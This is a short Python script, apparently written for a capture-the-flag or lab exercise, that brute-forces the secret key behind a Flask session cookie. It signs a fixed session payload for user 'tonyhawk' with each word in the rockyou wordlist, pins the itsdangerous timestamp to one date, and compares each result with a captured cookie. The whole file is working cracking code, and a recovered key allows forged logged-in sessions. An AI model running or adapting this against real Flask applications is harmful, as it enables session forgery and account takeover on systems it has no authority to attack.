import hashlib
import datetime

from itsdangerous import URLSafeTimedSerializer, TimestampSigner
from flask.json.tag import TaggedJSONSerializer

DATA_SESSION = {"logged_in":True, "username":"tonyhawk"}

# TODO: Add this to ask for user input
# Read cookie.example and set the contents to a variable 
with open('cookie.example', 'r') as f:
    COOKIE_EXAMPLE = f.read().strip()

# TODO: Ask for wordlist in user input
def crack_cookie():
    with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
        wordlist = f.read().splitlines()
    for word in wordlist:
        encoded_cookie = encode(word, DATA_SESSION)
        if encoded_cookie == COOKIE_EXAMPLE:
            print(f'Found secret: {word}')
            break


# THIS IS JUST FOR TESTING PURPOSES
# TODO: Remove this function
class DefaultTimestampSigner(TimestampSigner):
    def get_timestamp(self) -> int:
        # Parse the string into a datetime object
        dt = datetime.datetime.strptime('Wed, 10 May 2023 04:39:05', '%a, %d %b %Y %H:%M:%S')
        
        # Convert the datetime object to a Unix timestamp
        timestamp = dt.timestamp()
        return int(timestamp)
    
def encode(secret: str, data: dict) -> str:
    """
    Encode a Flask session cookie
    :param secret: Secret key
    :param data: Data to encode
    :return: Encoded cookie
    """

    signer = DefaultTimestampSigner

    return URLSafeTimedSerializer(
        secret_key=secret,
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer=signer,
        signer_kwargs={
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1}).dumps(data)

if __name__ == '__main__':
    # test_hash = encode('secretTEST', DATA_SESSION)
    # print(test_hash)

    crack_cookie()